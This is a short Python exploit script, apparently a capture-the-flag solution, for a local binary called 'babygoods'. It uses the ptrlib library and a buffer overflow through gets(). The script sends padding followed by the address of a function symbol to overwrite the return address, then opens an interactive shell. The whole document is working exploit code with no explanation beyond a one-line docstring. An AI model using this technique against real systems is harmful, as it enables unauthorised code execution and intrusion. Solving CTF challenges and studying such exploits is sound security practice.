"""
BOF by `gets()`
"""

from ptrlib import *

file = "./babygoods"
e = ELF(file)
sock = Process(file)
sock.debug = True

def build(name):
    sock.sendlineafter("Input: ", "1")
    sock.sendlineafter("pram (1-5):", "1")
    sock.sendlineafter("name:", name)

sock.sendlineafter("name: ", "yu1hpa")

payload = b"A"*0x20 + b"B"*8
payload += p64(e.symbol("sub_15210123"))
build(payload)

sock.sh()
